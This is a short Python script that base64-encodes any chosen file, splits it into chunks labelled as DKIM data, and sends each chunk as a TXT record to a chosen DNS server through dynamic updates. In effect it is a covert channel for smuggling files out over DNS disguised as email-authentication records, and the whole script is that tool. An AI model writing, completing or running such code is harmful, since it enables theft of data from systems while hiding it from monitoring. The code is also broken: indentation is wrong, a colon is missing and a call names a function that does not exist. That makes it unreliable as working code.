import base64
import dns.resolver
import dns.update
import dns.query
import dns.rdatatype


#encoding
def encode_to_base64(file_path):
	try:
		with open(file_path, 'rb') as file:
		file_contents = file.read()
		encoded_contents = base64.b64encode(file_contents)
		encoded_string = encoded_contents.decode('utf-8')
		return encoded_string
	except FileNotFoundError:
		print(f"Error: the file '{file_path}' was not found")
	except Exception as error:
		print(f"An error occured: {error}")

#split encoded text
def split_string_into_chunks(encoded_string, chunk_size=128)
	chunks = [encoded_string[i:i + chunk_size] for i in range(0, len(encoded_string), chunk_size)]
	return chunks
	
#marking for DKIM
def create_dkim_packets(chunks):
	dkim_packets = []
	for index, chunk in enumerate(chunks):
		dkim_packet = f"DKIM-{index + 1:03d}: {chunk}"
		dkim_packets.append(dkim_packet)
	return dkim_packets

def create_txt(dns_server, domain, txt_record):
	try:
		update = dns.update.Update(domain)
		update.add(domain, 3600, dns.rdatatype.TXT, txt_record)
		response = dns.query.tcp(update, dns_server)
		print(f"DNS UPDATE response: {response}")
	except Exception as error:
		print(f"An error occurred during DNS update: {error}")
	
if __name__ == "__main__":
	file_path = input("Enter file path: ")
	encoded_string = encode_to_base64(file_path)
		
	if encoded_string:
		chunks = split_string_into_chunks(encoded_string, 48)
		dkim_packets = create_dkim_packets(chunks)
		
		for packet in dkim_packets:
			print(packet)
	
	dns_server = input("DNS Server IP: ")
	domain = input("DOmain for TXT record: ")
	
for packet in dkim_packets:
	create_txt_record(dns_server, domain, packet)
